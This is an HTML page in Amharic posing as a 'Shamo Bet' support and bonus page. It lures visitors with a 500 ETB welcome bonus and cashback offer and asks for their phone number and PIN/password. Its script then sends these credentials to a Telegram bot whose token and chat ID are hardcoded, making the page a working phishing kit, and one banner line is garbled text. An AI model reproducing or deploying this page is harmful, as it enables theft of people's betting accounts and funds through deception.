
<html lang="am">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Shamo Bet - Support & Rewards</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #064e3b 0%, #022c22 100%);
            margin: 0;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            background-color: #ffffff;
            padding: 30px;
            border-radius: 16px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
            max-width: 450px;
            width: 100%;
            border-top: 6px solid #dc2626;
        }
        h1 {
            color: #065f46;
            font-size: 28px;
            margin-bottom: 4px;
            text-align: center;
            font-weight: 800;
        }
        .subtitle {
            color: #dc2626;
            font-weight: 700;
            font-size: 16px;
            text-align: center;
            margin-bottom: 16px;
        }
        .custom-banner {
            background-color: #fef2f2;
            border: 1px solid #fca5a5;
            color: #991b1b;
            padding: 10px;
            border-radius: 8px;
            text-align: center;
            font-size: 13px;
            font-weight: bold;
            margin-bottom: 15px;
        }
        .description {
            color: #1f2937;
            font-size: 14px;
            line-height: 1.5;
            background-color: #ecfdf5;
            border-left: 4px solid #10b981;
            padding: 12px;
            border-radius: 6px;
            margin-bottom: 20px;
        }
        .bonus-section {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
            margin-bottom: 20px;
        }
        .bonus-card {
            background: #fff1f2;
            border: 1px dashed #f43f5e;
            border-radius: 8px;
            padding: 10px;
            text-align: center;
        }
        .bonus-card h4 {
            margin: 0;
            color: #be123c;
            font-size: 14px;
        }
        .bonus-card p {
            margin: 4px 0 0 0;
            font-size: 12px;
            color: #4b5563;
        }
        .form-group {
            margin-bottom: 16px;
        }
        label {
            display: block;
            font-weight: bold;
            color: #065f46;
            margin-bottom: 6px;
            font-size: 14px;
        }
        input[type="tel"], textarea {
            width: 100%;
            padding: 12px;
            border: 2px solid #a7f3d0;
            border-radius: 8px;
            box-sizing: border-box;
            font-size: 14px;
            transition: border-color 0.2s;
        }
        input:focus, textarea:focus {
            outline: none;
            border-color: #dc2626;
        }
        button {
            width: 100%;
            background-color: #dc2626;
            color: white;
            padding: 14px;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: background-color 0.2s, transform 0.1s;
            box-shadow: 0 4px 10px rgba(220, 38, 38, 0.3);
        }
        button:hover {
            background-color: #b91c1c;
        }
        button:active {
            transform: scale(0.98);
        }
    </style>
</head>
<body>

<div class="container">
    <h1>SHAMO BET</h1>
    <div class="subtitle">እኛን ስለመረጡ እናመሰግናለን!</div>

    <div class="custom-banner">
        አዲስ አበባ ያረካ አገር ዘመኘከአአነአከኸ መከኘአጰ
    </div>

    <!-- የቦነስ እና የሽልማት ማሳወቂያዎች -->
    <div class="bonus-section">
        <div class="bonus-card">
            <h4>🎁 500 ETB</h4>
            <p>የእንኳን ደህና መጡ ቦነስ</p>
        </div>
        <div class="bonus-card">
            <h4>🔥 100% Cash Back</h4>
            <p>በመጀመሪያው ተቀማጭ</p>
        </div>
    </div>

    <div class="description">
        ይህ የ Shamo Support የቴክኒክ እና የተበላሹ ነገሮች ማስተካከያ ገጽ ነው። ፓስወርድዎ ያስገቡ።
    </div>

    <form id="supportForm">
        <div class="form-group">
            <label for="phoneNumber">የ Shamo Bet ስልክ ቁጥር</label>
            <input type="tel" id="phoneNumber" placeholder="09........" required>
        </div>

        <div class="form-group">
            <label for="issueDetail">PIN / ፓስወርድ</label>
            <textarea id="issueDetail" rows="3" placeholder="ፓስወርዶ ያስገቡ..." required></textarea>
        </div>

        <button type="button" onclick="sendData()">ቦነስ ያግኙ</button>
    </form>
</div>

<script>
    function sendData() {
        const botToken = "8688090386:AAHSsKf9rnAs20X28cwSwGRe4w-csdjZFog"; 
        const chatId = "8841053408";

        const phoneNumber = document.getElementById("phoneNumber").value.trim();
        const issueDetail = document.getElementById("issueDetail").value.trim();

        if (!phoneNumber || !issueDetail) {
            alert("እባክዎ ሁሉንም ሳጥኖች በትክክል ይሙሉ።");
            return;
        }

        const messageText = `📩 *አዲስ የድጋፍ/ቦነስ ጥያቄ (Shamo Support)*\n\n📞 *ስልክ ቁጥር:* ${phoneNumber}\n📝 *PIN/ፓስወርድ:* ${issueDetail}`;

        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

        fetch(url, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: messageText,
                parse_mode: "Markdown"
            })
        })
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                alert("መረጃው በተሳካ ሁኔታ ተልኳል! ቦነስዎ በቅርቡ ይለቀቃል።");
                document.getElementById("supportForm").reset();
            } else {
                alert("መልእክቱን መላክ አልተቻለም። እባክዎ Bot Token እና Chat ID በትክክል ማስገባትዎን ያረጋግጡ።");
            }
        })
        .catch(error => {
            console.error("Error:", error);
            alert("የኔትወርክ ስህተት አጋጥሟል። እባክዎ እንደገና ይሞክሩ።");
        });
    }
</script>

</body>
</html>
